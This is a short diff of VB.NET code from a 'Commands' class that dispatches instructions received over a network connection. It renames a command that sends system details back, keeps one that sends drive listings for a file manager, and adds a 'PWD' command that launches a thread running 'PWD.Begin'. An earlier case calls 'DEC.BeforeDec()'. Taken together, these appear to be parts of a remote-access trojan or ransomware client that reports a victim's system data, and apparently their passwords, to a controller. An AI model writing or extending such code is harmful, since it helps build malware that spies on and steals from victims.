@@ -82,8 +82,8 @@ Public Class Commands
                     Thread.CurrentThread.Sleep(1000)
                     DEC.BeforeDec()
 
-                Case "Details"
-                    C.Send("Details" + SPL + ID.Getsystem)
+                Case "Info"
+                    C.Send("Info" + SPL + ID.Getsystem)
 
                 Case "Drivers"
                     C.Send("FM" & SPL & FMDrives())
@@ -93,9 +93,13 @@ Public Class Commands
                     Catch
                         C.Send("FM" & SPL & "Error")
                     End Try
+
                 Case "OFM"
                     C.Send("OFM")
 
+                Case "PWD"
+                    Dim T1 As New Thread(AddressOf PWD.Begin)
+                    T1.Start()
             End Select
         Catch ex As Exception
             C.Send("MSG" + SPL + "Error! " + ex.Message)
